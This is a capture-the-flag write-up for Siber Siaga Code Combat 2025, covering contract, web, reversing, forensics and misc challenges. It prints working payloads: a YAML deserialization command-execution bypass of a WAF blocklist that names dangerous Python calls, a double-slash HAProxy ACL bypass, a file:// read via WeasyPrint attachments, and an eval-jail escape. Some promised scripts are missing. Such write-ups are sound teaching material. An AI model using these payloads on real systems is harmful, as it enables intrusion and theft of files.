### Puzzle

![Puzzle Challenge](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/puzzle.png)

The challenge provides two main contracts:

**Setup.sol** — the deployment/setup contract.

![Setup Contract](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/puzzle1.png)

**Puzzle.sol** — the main puzzle contract with the encryption/decryption logic.

![Puzzle Contract](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/puzzle2.png)

#### Encryption/Decryption Analysis

The contract uses a simple byte-wise key that depends on constants and an index `i`:

**Encryption key** (used when data was encrypted):
```solidity
key = (A + B + SALT + i) % 256
```

**Decryption key** (used when `reveal()` runs):
```solidity
key = (A + B + SALT + seedVar + i) % 256
```

**Problem:** `seedVar` was initialized to 1. That single-byte offset makes the decryption key differ from the encryption key by 1, so `reveal()` returns garbled data until `seedVar` is corrected.

#### Solution

We need to set `seedVar = 0`. The contract exposes a state-changing setter `seedVarStateChanging(x)`, but it only accepts `x` values that satisfy:

```mathematica
(x² + 7) % 256 == 0
⇔ x² ≡ −7 (mod 256)
⇔ x² ≡ 249 (mod 256)
```

**Modular math result:** Working modulo 256 gives four valid solutions:
```
x ∈ {53, 75, 181, 203}
```

Any one of these values, when passed to `seedVarStateChanging`, will set `seedVar` to 0 and restore the correct decryption key.

#### Proof

**Before the fix:**
- `seedVar = 1`
- Decryption key: `(A + B + SALT + 1 + i) % 256`
- Encryption key: `(A + B + SALT + i) % 256`
- Keys differ by 1 → decrypted bytes are shifted → garbage

**After the fix:**
- `seedVar = 0` (after calling `seedVarStateChanging(x)` with a valid x)
- Decryption key: `(A + B + SALT + 0 + i) % 256 == (A + B + SALT + i) % 256`
- Keys match → `reveal()` returns the intended plaintext (the flag)

Below is a Foundry Solidity script to call `seedVarStateChanging` with any one of the solutions:

## Web Challenges

### Bulk Imports Not Blue

![Bulk Imports Challenge](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/bulkblue.png)

This was a web exploitation challenge involving a Flask application with YAML deserialization vulnerability protected by a Web Application Firewall (WAF).

The application had a portal authentication system that needed to be bypassed to access the `/challenge` endpoint.

**Payload 1:** Set portal preferences to enable beta features
```json
{"prefs": {"features": ["beta", "meta"]}}
```
URL encoded: `%7B%22prefs%22%3A+%7B%22features%22%3A+%5B%22beta%22%2C+%22meta%22%5D%7D%7D`

**Payload 2:** Escalate privileges and unlock challenge area
```json
{"__class__":{"role":"admin"},"unlock":true}
```
URL encoded: `%7B%22__class__%22%3A%7B%22role%22%3A%22admin%22%7D%2C%22unlock%22%3Atrue%7D`

#### Step 2: WAF Analysis

The application had a WAF with specific regex patterns blocking dangerous YAML constructs:

```python
waf_blocklist = [
    "!!python/object/apply\\s*:\\s*os\\.(system|popen|execl|execv|execve|spawnv|spawnve)",
    "!!python/object/apply\\s*:\\s*subprocess\\.",
    "!!python/object/apply\\s*:\\s*eval",
    "__import__|\\bbuiltins\\b|globals\\(|locals\\(|compile\\(|exec\\(",
    "!!python/name|!!python/module",
    "!!python/object/apply\\s*:\\s*(?:open|io\\.open|codecs\\.open)",
    "pathlib\\s*\\.\\s*Path\\s*\\(.*?\\)\\s*\\.\\s*(read_text|read_bytes)",
    "os\\.(fdopen|popen|popen2|popen3|popen4)"
]
```

**Key WAF Vulnerability:** The WAF only blocked `!!python/object/apply` but completely missed `!!python/object/new`!

#### Step 3: Directory Enumeration

First, I enumerated the filesystem to locate the flag:

**Payload:**
```yaml
yaml_content=!!python/object/apply:os.listdir ["/"]
```
URL encoded: `%21%21python%2Fobject%2Fapply%3Aos.listdir%20%5B%22%2F%22%5D`

**Result:** Found `flag.txt` in the root directory

#### Step 4: Bypassing Sensitive Token Filter

The application had a secondary filter that blocked requests containing normalized versions of sensitive strings:
```python
sensitive_tokens = ["flagtxt", "procselfenviron", "etcpasswd"]
```

Any payload containing "flag.txt" would be normalized to "flagtxt" and blocked.

#### Step 5: Final Exploitation

The solution was to combine two bypass techniques:
1. Use `!!python/object/new` instead of `apply` to bypass the WAF
2. Use wildcards (`/f*.txt`) to avoid the sensitive token filter

**Final Payload:**
```yaml
yaml_content=!!python/object/new:subprocess.getoutput ["cat /f*.txt"]
```
URL encoded: `%21%21python%2Fobject%2Fnew%3Asubprocess.getoutput%20%5B%22cat%20%2Ff%2A.txt%22%5D`

![Flag Result](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/bulkblue1.png)

**FLAG:** `SIBER25{G3u33s_W4_N44dB3tT33r_S3cuR30394578}`

### Bulk Import Blues

![Bulk Import Blues](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/bulkimport.png)

The website accepts YAML data. Because it uses `yaml.load` unsafely, we can inject Python objects with `!!python/object/apply`.

We use a payload to explore the filesystem and find the flag:

### Private Party

![Private Party Challenge](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/party.png)

The "Private Party" challenge involves a Flask web application protected by an HAProxy reverse proxy. The goal is to access a user dashboard to retrieve a flag.

Analysis of the source code reveals that dashboard access is restricted to users who have been created through a special `/admin` endpoint. However, the HAProxy configuration explicitly denies all requests to paths beginning with `/admin`.

#### 1. Reconnaissance and Analysis

**Architecture (docker-compose.yml & haproxy.cfg)**

The docker-compose.yml file shows two services: web (the Flask app) and haproxy (the reverse proxy). The proxy listens on port 8001 and forwards traffic to the Flask app on port 5000.

The critical piece of information is in haproxy.cfg:
```
frontend http
    bind *:8001
    default_backend web
    ...
    acl is_admin_path path_beg,url_dec -i /admin
    http-request deny if is_admin_path
```

This Access Control List (ACL) rule, `is_admin_path`, uses `path_beg` to check if the request path starts with `/admin`. If it does, the request is denied.

**Application Logic (app.py)**

The login() function contains a crucial check:
```python
# From /login route
u = dbs.query(User).filter_by(username=data.get("username")).first()
# ...
if not u.registered_via_admin:
    flash("Access denied: account not registered via admin.", "error")
    return render_template("login.html"), 403
```

A user can only log in successfully if their `registered_via_admin` attribute in the database is True.

![Admin Endpoint Code](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/party1.png)

#### 2. The Vulnerability: Path Normalization

The vulnerability stems from an inconsistency in how different layers of the web stack parse a URL path:

- **HAProxy (path_beg):** This rule performs a literal, case-insensitive string comparison. It checks if the path string starts with the exact characters `/admin`. A path like `//admin` does not meet this condition, as it starts with `//a`. Therefore, HAProxy's ACL does not block it.

- **Flask (Werkzeug):** When the request for `//admin` is forwarded to the backend, Flask's routing engine (Werkzeug) automatically normalizes the path. It collapses multiple slashes into one, treating `//admin` as being identical to `/admin`.

#### 3. Exploitation

**Step 1: Create a Privileged User**

```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"cofastic", "password":"123"}' \        
  http://5.223.49.127:8001//admin
```

![User Creation](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/party2.png)

**Step 2: Log In and Capture the Flag**

With the privileged user created, we can now navigate to the login page and enter the credentials.

### SafePDF

![SafePDF Challenge](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/safepdf.png)

The challenge presents a PDF conversion service that takes a URL input and generates a PDF snapshot of the webpage. The service uses WeasyPrint, a Python library for converting HTML to PDF.

**Key insight:** Using the `<link>` tag with `rel="attachment"` attribute:
```html
<link rel="attachment" href="file:///path/to/file">
```

This feature allows WeasyPrint to embed file contents as attachments within the generated PDF.

#### Payload Development

Created an HTML payload with multiple `<link>` tags targeting common flag locations: [Payload Link](https://gist.github.com/Cofastic/ebc94a34b0fab5e3a26cbdf4972be6f5/raw/f2ccd6f0df71d41b745c4aa0754b7b9ed123dd69/payload.html)

#### PDF Content Extraction

Used a Python script to extract the embedded file contents from the PDF: [Script Link](https://gist.github.com/Cofastic/50dd5e1cb827260d2ef7ea910223446d/raw/0701f59b4ac92623fbd2d40730ed02a8196e0423/script.py)

**Step 1: Host the Payload**
- Created a GitHub Gist with the malicious HTML
- Obtained the raw URL for the payload

**Step 2: Submit to Target**
- Accessed the service
- Submitted the GitHub Gist raw URL

### EcoQuery

![EcoQuery Challenge](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/ecoquery.png)

`InputHandler::extractPrimaryIdentifier()` returns `admin` (the first username), while `$_POST['username']` is `guest`. Because the app trusts both values, both checks succeed — logging us in as `guest` but with `admin` privileges.

## Reverse Engineering

![Reverse Engineering Banner](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/easycipher.png)

### R1 - Easy Cipher

#### Summary

This challenge provides an ELF binary named `r1`. The binary prints a banner, reads 8 bytes from itself (the ELF header), and uses those bytes as a secret key. It then applies a custom 2-round XOR-based Feistel cipher on each half of the user input and compares the result with hardcoded ciphertext constants.

#### Key

The key is the first 8 bytes of the ELF file header:
```
7f 45 4c 46 02 01 01 00
```

These bytes are the standard ELF magic header, making the key easy to find.

#### Cipher

Each half of the input is padded to a multiple of 8 and split into 8‑byte blocks. Each block is divided into L and R (4 bytes each) and goes through 2 Feistel rounds.

**Round function:** `F(R, i) = R XOR key[(j+i) % 8]`, where key is repeated as needed.

**Feistel flow per block:**
```
L1 = R0
R1 = L0 XOR F(R0, 1)
L2 = R1
R2 = L1 XOR F(R1, 2)
```

#### Ciphertexts

Two 16‑byte ciphertext halves stored in `.rodata`:
- **Half1:** `0x4606435a3c313744`, `0x5c333a677d444c52`
- **Half2:** `0x37776656442a4e68`, `0x71777c3a50080943`

#### Reversing

To solve, implement the inverse of the Feistel network. From ciphertext (L2,R2), undo round 2 to get (L1,R1), then undo round 1 to get (L0,R0). Concatenate to recover the original plaintext.

#### Decrypt Script

```python
import struct

key = bytes([0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00])

def f_fun(R, i):
    return bytes([R[j]^key[(j+i)%8] for j in range(len(R))])

def feistel_dec(b):
    L2,R2=b[:4],b[4:]
    R1=L2
    L1=bytes([a^b for a,b in zip(R2,f_fun(R1,2))])
    R0=L1
    L0=bytes([a^b for a,b in zip(R1,f_fun(R0,1))])
    return L0+R0

def dec_half(ct):
    return feistel_dec(ct[:8])+feistel_dec(ct[8:])

def qw(q1,q2):
    return struct.pack('<Q',q1)+struct.pack('<Q',q2)

c1=qw(0x4606435a3c313744,0x5c333a677d444c52)
c2=qw(0x37776656442a4e68,0x71777c3a50080943)

print(dec_half(c1)+dec_half(c2))
```

**Output:** `b'SIBER25{n0w_y0u _l34rn_r3v3r53} '`

**Flag:** `SIBER25{n0w_y0u_l34rn_r3v3r53}`

### ViewPort

![ViewPort Challenge](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/viewport.png)

"Oops. I accidentally deleted the flag when cleaning up my Desktop."

**Files Provided:**

![Challenge Files](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/viewport1.png)

- `Viewport.ad1` (Forensic disk image)
- Zip Password: `e0ff450ab4c79a7810ad46b45f4b8f10678a63df866757566d17b8b998be4161`

#### Understanding the Challenge

The challenge description indicates that a flag file was accidentally deleted from the Desktop during cleanup. This is a classic Windows forensics scenario requiring recovery of deleted files from an AD1 forensic image.

Upon going through the files within the provided image file, I located interesting files:

![Icon Cache Files](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/viewport2.png)

**File Found:** `iconcache_*.db`  
**Location:** `Users/chaib/AppData/Local/Microsoft/Windows/Explorer/`

These Windows icon cache databases store thumbnail images of files at various resolutions (256x256 in this case). Additionally, these thumbnails can persist even after the original files are deleted.

I used **ThumbCacheViewer** ([https://thumbcacheviewer.github.io](https://thumbcacheviewer.github.io)) to view these cached thumbnails.

**Process:**
1. Extracted all the `iconcache_*.db` files to my local machine
2. Examined them in ThumbCacheViewer
3. Browsed through cached thumbnail images

I located a cached thumbnail image containing the parts of the flag text:

![Flag Thumbnail](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/viewport3.png)

The flag was embedded in a thumbnail that had been cached when the original flag file was viewed on the Desktop. Even though the original file was deleted during "cleanup," its thumbnail representation remained in the Windows icon cache.

![Byte Tales Challenge](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/byte.png)

The challenge provides a Python-based interactive story game with source code.

Looking at `source.py`, the game has multiple paths:
1. Following the main story path (stages 1-5)
2. Taking the alternative path via `alt_path()`
3. Getting punished in the `jail()` function

The critical vulnerability is in the `jail()` function:

![Jail Function](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/byte1.png)

- The `jail()` function accepts user input and passes it to `eval()`
- There's a blacklist of dangerous keywords, but it's incomplete
- File operations like `open()` are not blacklisted
- The flag is likely in `flag.txt`

**To trigger the jail() function:**
1. Choose "B" (Walk out into the unknown)
2. When prompted "Is this what you really wish for?", enter any invalid option (not "A" or "B")
3. This triggers the else clause in `alt_path()` which calls `jail()`

**Exploiting the Vulnerability:**

The `eval()` function executes our input but doesn't print results. We need a payload that forces output or causes an error revealing the flag.

**Working payload:** `help(open('flag.txt').read())`

This payload:
1. Opens and reads the flag file content
2. Passes the flag string to `help()`
3. The `help()` function displays information about the string, revealing the flag

**Recap:**
1. Connect to the service: `nc 5.223.49.127 57001`

2. Choose "B" to walk into the unknown

3. Enter "C" (or any invalid choice) to trigger jail

4. Enter payload: `help(open('flag.txt').read())`

5. The error message reveals the flag

### Spelling Bee

![Spelling Bee Challenge](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/bee.png)

The "Flag Spelling Bee" was a misc category CTF challenge that required guessing characters one by one to reveal a hidden flag. You only get 5 attempts per connection before being kicked out.

**Constraints:**
- Maximum 5 character guesses per session
- Flag Length: 46 characters
- Final Flag: `SIBER25{s0me71me5_lif3_c4n_b3_a_l1ttl3_p0ta70}`

When connecting to the service, we're presented with:

![Service Interface](https://github.com/cofastic/repo/blob/main/2025/Siber%20Siaga%20Code%20Combat%202025/img/bee1.png)

I noticed that each correct guess reveals ALL instances of that character in the flag. Wrong guesses count against the 5-try limit. The connection closes after 5 tries, but we can reconnect unlimited times, and each new connection resets the attempt counter.

**Strategy:**
The new connection gives us a fresh set of 5 attempts. This meant we could:
1. Connect to the service
2. Guess up to 5 characters (aiming for 4-5 correct ones)
3. Get disconnected
4. Reconnect and repeat 
5. Slowly map out the entire flag

Rather than guessing randomly, I used a methodical approach by trying common characters. As more characters were revealed, patterns emerged.

**Recognizing the Flag Format:**
As characters filled in, readable words emerged:
- `s0me_1me5` = "sometimes"
- `lif3` = "life"  
- `c4n` = "can"
- `b3` = "be"
- `l1ttl3` = "little"
- `p0ta70` = "potato"

**Flag Evolution:**
Each session revealed more characters. Here's how the flag evolved:

**Session 1-3:** Basic character discovery
```
___________e___e_______c___b__a___________a___
```

**Session 4-6:** Numbers and structure
```
SIBER25{s_me_1me5_l_f3_c___b3_a_l1ttl3_p_ta__}
```

**Session 7-9:** Filling gaps
```
SIBER25{s0me_1me5_lif3_c_n_b3_a_l1ttl3_p0ta_0}
```

**Final Sessions:** Last missing pieces
```
SIBER25{s0me71me5_lif3_c4n_b3_a_l1ttl3_p0ta70}
```

**Character Priority:**
I prioritized characters roughly in this order:
1. Vowels: e, a, i, o, u
2. Common consonants: r, s, t, n, l
3. Numbers: 0, 1, 2, 3, 5, 7
4. Special characters: {, }

**Complete Flag:** `SIBER25{s0me71me5_lif3_c4n_b3_a_l1ttl3_p0ta70}`
